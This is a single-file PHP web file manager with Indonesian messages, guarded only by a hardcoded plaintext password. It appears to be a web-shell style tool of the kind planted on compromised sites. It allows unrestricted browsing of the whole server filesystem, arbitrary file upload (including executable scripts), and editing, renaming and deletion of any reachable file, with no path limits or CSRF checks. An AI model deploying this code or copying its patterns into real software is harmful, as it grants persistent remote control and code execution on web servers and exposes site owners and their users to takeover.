<?php
// filemanager.php - Tailwind File Manager with Auth & Status Messages

session_start();
$auth_password = 'papakilo'; // Ganti dengan password kamu
$status = '';
$status_class = '';

if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['password'] === $auth_password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>Login</title><link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"></head><body class="bg-gray-100 flex items-center justify-center h-screen">
        <form method="post" class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
            <h2 class="mb-4 text-xl font-bold">Login File Manager</h2>
            <input type="password" name="password" placeholder="Password" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 mb-3">
            <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">Login</button>
        </form></body></html>';
        exit;
    }
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$files = scandir($path);

function h($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function full_path($base, $file) {
    return rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $current = realpath($_POST['current'] ?? getcwd());

    switch ($action) {
        case 'upload':
            if (isset($_FILES['file'])) {
                $success = move_uploaded_file($_FILES['file']['tmp_name'], full_path($current, $_FILES['file']['name']));
                $status = $success ? 'File berhasil di-upload.' : 'Gagal upload file.';
                $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            }
            break;
        case 'newfile':
            $success = file_put_contents(full_path($current, $_POST['name']), '') !== false;
            $status = $success ? 'File berhasil dibuat.' : 'Gagal membuat file.';
            $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            break;
        case 'newfolder':
            $success = mkdir(full_path($current, $_POST['name']));
            $status = $success ? 'Folder berhasil dibuat.' : 'Gagal membuat folder.';
            $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            break;
        case 'delete':
            $target = full_path($current, $_POST['name']);
            $success = false;
            if (is_file($target)) $success = unlink($target);
            if (is_dir($target)) $success = rmdir($target);
            $status = $success ? 'Berhasil menghapus.' : 'Gagal menghapus.';
            $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            break;
        case 'rename':
            $success = rename(full_path($current, $_POST['old']), full_path($current, $_POST['new']));
            $status = $success ? 'Berhasil rename.' : 'Gagal rename.';
            $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            break;
        case 'save':
            $success = file_put_contents(full_path($current, $_POST['name']), $_POST['content']) !== false;
            $status = $success ? 'Perubahan berhasil disimpan.' : 'Gagal menyimpan file.';
            $status_class = $success ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            break;
        case 'chdir':
            header("Location: ?path=" . urlencode(realpath(full_path($current, $_POST['name']))));
            exit;
    }
    header("Location: ?path=" . urlencode($current) . "&status=" . urlencode($status) . "&class=" . urlencode($status_class));
    exit;
}

$editing = isset($_GET['edit']) ? $_GET['edit'] : null;
if (isset($_GET['status'])) {
    $status = $_GET['status'];
    $status_class = $_GET['class'] ?? 'bg-blue-100 text-blue-700';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>File Manager</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 p-6">
  <div class="max-w-6xl mx-auto bg-white p-6 rounded shadow">
    <h1 class="text-2xl font-bold mb-4">Mini File Manager</h1>
    <p class="mb-2"><strong>Current Path:</strong> <?= h($path) ?></p>
    <div class="mb-4 text-sm text-blue-600">
      <?php
        $parts = explode(DIRECTORY_SEPARATOR, $path);
        $cumulative = "";
        foreach ($parts as $i => $part):
          if ($part === '') continue;
          $cumulative .= DIRECTORY_SEPARATOR . $part;
          echo '<a href="?path=' . urlencode($cumulative) . '" class="hover:underline">' . h($part) . '</a>/';
        endforeach;
      ?>
    </div>

    <?php if ($status): ?>
      <div class="mb-4 p-2 rounded <?= h($status_class) ?>">
        <?= h($status) ?>
      </div>
    <?php endif; ?>

    <div class="flex flex-wrap gap-4 mb-6">
      <form method="post" enctype="multipart/form-data" class="flex gap-2 items-center">
        <input type="hidden" name="action" value="upload">
        <input type="hidden" name="current" value="<?= h($path) ?>">
        <input type="file" name="file" class="text-sm">
        <button class="bg-blue-500 text-white px-4 py-1 rounded">Upload</button>
      </form>

      <form method="post" class="flex gap-2 items-center">
        <input type="hidden" name="action" value="newfile">
        <input type="hidden" name="current" value="<?= h($path) ?>">
        <input type="text" name="name" placeholder="New file" class="border p-1 rounded">
        <button class="bg-green-500 text-white px-4 py-1 rounded">New File</button>
      </form>

      <form method="post" class="flex gap-2 items-center">
        <input type="hidden" name="action" value="newfolder">
        <input type="hidden" name="current" value="<?= h($path) ?>">
        <input type="text" name="name" placeholder="New folder" class="border p-1 rounded">
        <button class="bg-yellow-500 text-white px-4 py-1 rounded">New Folder</button>
      </form>
    </div>

    <table class="w-full table-auto text-sm">
      <thead class="bg-gray-200">
        <tr><th class="text-left px-2 py-1">Name</th><th class="text-left px-2 py-1">Type</th><th class="text-left px-2 py-1">Actions</th></tr>
      </thead>
      <tbody>
        <?php foreach ($files as $f): 
          if ($f === '.') continue;
          $fp = full_path($path, $f);
        ?>
        <tr class="border-t">
          <td class="px-2 py-1">
            <?php if (is_dir($fp)): ?>
              <form method="post" class="inline">
                <input type="hidden" name="action" value="chdir">
                <input type="hidden" name="current" value="<?= h($path) ?>">
                <input type="hidden" name="name" value="<?= h($f) ?>">
                <button class="text-blue-600 hover:underline">📁 <?= h($f) ?></button>
              </form>
            <?php else: ?>
              <a href="?path=<?= urlencode($path) ?>&edit=<?= urlencode($f) ?>" class="text-gray-800 hover:underline">📄 <?= h($f) ?></a>
            <?php endif; ?>
          </td>
          <td class="px-2 py-1"><?= is_dir($fp) ? 'Folder' : 'File' ?></td>
          <td class="px-2 py-1">
            <div class="flex gap-2">
              <form method="post" class="inline">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="current" value="<?= h($path) ?>">
                <input type="hidden" name="name" value="<?= h($f) ?>">
                <button class="bg-red-100 text-red-700 px-2 py-1 rounded text-xs" onclick="return confirm('Delete <?= h($f) ?>?')">Delete</button>
              </form>
              <form method="post" class="inline flex items-center gap-1">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="current" value="<?= h($path) ?>">
                <input type="hidden" name="old" value="<?= h($f) ?>">
                <input type="text" name="new" value="<?= h($f) ?>" class="border px-1 py-0.5 text-xs rounded">
                <button class="bg-green-100 text-green-700 px-2 py-1 rounded text-xs">Rename</button>
              </form>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>

    <?php if ($editing): 
      $edit_path = full_path($path, $editing);
      if (is_file($edit_path)): ?>
      <div class="mt-6">
        <h2 class="text-lg font-semibold mb-2">Editing: <?= h($editing) ?></h2>
        <form method="post">
          <input type="hidden" name="action" value="save">
          <input type="hidden" name="current" value="<?= h($path) ?>">
          <input type="hidden" name="name" value="<?= h($editing) ?>">
          <textarea name="content" class="w-full h-80 border p-2 font-mono text-sm"><?= h(file_get_contents($edit_path)) ?></textarea>
          <button class="mt-2 bg-blue-600 text-white px-4 py-1 rounded">Save</button>
        </form>
      </div>
    <?php endif; endif; ?>
  </div>
</body>
</html>
